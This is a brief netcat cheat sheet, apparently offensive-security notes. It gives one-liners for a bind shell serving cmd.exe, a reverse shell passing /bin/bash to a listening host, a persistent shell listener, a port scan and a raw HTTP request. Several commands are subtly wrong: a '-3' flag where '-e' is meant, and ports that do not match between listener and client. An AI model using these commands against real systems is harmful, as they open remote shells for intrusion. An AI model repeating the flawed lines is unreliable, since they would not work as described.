# Netcat Usage

```bash
# Bind Shell w/ cmd shell
nc -nlvp 444 -e cmd.exe
nc -nv <target w/ listener> 4444 
```

```bash
# Reverse Shell w/ cmd shell to listening host
nc -nlvp 4444
nc -nv <target w/ listener> 4444 -3 /bin/bash
```

```bash
# Reverse shell w/ persistance
nc -nLvp 44445 -e cmd.exe
nc -nv <target w/ listener> 4445
```

```bash
# Receive return packages on a different port
nc -nLvp 44445 -e cmd.exe
nc -nv -p 4849 <target w/ listener> 4445
```

```bash
# Netcat portscan
nc -n -v -z -w1 <target_ip> 100-250
```

```bash
# Netcat connecting to HTTP service
nc <target> 80
GET / HTTP/1.0
HOST: <IP>
```
